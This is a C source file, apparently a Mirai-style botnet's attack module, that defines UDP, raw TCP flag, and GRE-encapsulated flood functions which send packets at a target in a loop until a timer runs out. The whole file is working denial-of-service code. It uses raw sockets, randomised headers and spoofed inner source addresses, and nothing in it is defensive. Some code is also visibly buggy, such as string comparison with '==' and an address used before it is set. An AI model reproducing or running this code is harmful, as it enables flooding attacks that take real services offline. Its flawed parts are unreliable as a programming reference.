#define _GNU_SOURCE

#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <time.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/checksum.h"
#include "headers/rand.h"
#include "headers/table.h"
#include "headers/util.h"

struct grehdr {
    uint16_t opts, protocol;
};

void udpattack(unsigned char *target, int port, int secs, int packetsize)
{
struct sockaddr_in dest_addr;
int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
if(!sockfd) return;

dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(port);
dest_addr.sin_addr.s_addr = inet_addr(target);

unsigned char buf[packetsize];
rand_str(buf,packetsize);
if(buf == NULL) return;
time_t start = time(NULL);
connect(sockfd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
while(1) 
 {
  send(sockfd, buf, strlen(buf), MSG_NOSIGNAL);
      if(time(NULL) >= start + secs)
	  {
	   close(sockfd);
	   exit(0);
	  }
 }
}

void tcpattack(unsigned char *target, int port, int secs, int packetsize, char *flags)
{

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_next();
        else dest_addr.sin_port = htons(port);
        dest_addr.sin_addr.s_addr = inet_addr(target);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

	    iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetsize;
        iph->id = rand_next();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dest_addr.sin_addr.s_addr;

        tcph->source = rand_next();
        tcph->seq = rand_next();
        tcph->ack_seq = 0;
        tcph->doff = 5;
		
        if(flags == "urg")
		tcph->urg = 1;
	    else if(flags == "ack")
		tcph->ack = 1;
	    else if(flags == "rst")
		tcph->rst = 1;
		else if(flags == "fin")
		tcph->fin = 1;
		else if(flags == "psh")
		tcph->psh = 1;
	    else{
			tcph->urg = 1;
			tcph->ack = 1;
			tcph->fin = 1;
			tcph->psh = 1;
			tcph->rst = 1;
		}
	
        tcph->window = rand_next();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_next() : htons(port));
        tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + packetsize);

        iph->check = checksum_generic ((unsigned short *) packet, iph->tot_len);

        time_t start = time(NULL);
        while(1)
        {
                iph->saddr = LOCAL_ADDR;
                iph->id = rand_next();
                tcph->seq = rand_next();
                tcph->source = rand_next();
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + packetsize);
                iph->check = checksum_generic ((unsigned short *) packet, iph->tot_len);
				sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
				if(time(NULL) >= start + secs)
				{
				close(sockfd);
				exit(0);
				}
        }
}

void greattack(unsigned char *target, int port, int secs, int packetsize)
{
	    struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;
		struct sockaddr_in dest_addr;

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct udphdr) + packetsize];
        iph = (struct iphdr *)packet;
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);

        // IP header init
        iph->version = 4;
        iph->ihl = 5;
        iph->tos = 0;
        iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + packetsize);
        iph->id = rand_next();
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_GRE;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = dest_addr.sin_addr.s_addr;
		
        greh->protocol = htons(ETH_P_IP);
        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = 0;
        greiph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct udphdr) + packetsize);
        greiph->id = rand_next();
        greiph->ttl = MAXTTL;
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        greiph->daddr = ~(greiph->saddr - 1024);

        udph->source = rand_next();
        udph->dest = htons(port);
        udph->len = htons(sizeof (struct udphdr) + packetsize);
		
		time_t start = time(NULL);
        while(1)
        {
		    iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof (struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + packetsize);
			
			dest_addr.sin_family = AF_INET;
            dest_addr.sin_port = htons(port);
            dest_addr.sin_addr.s_addr = inet_addr(target);
			
  sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + packetsize, MSG_NOSIGNAL, (struct sockaddr *)&dest_addr, sizeof (struct sockaddr_in));
                if(time(NULL) >= start + secs)
				{
				close(sockfd);
				exit(0);
				}
		}
}
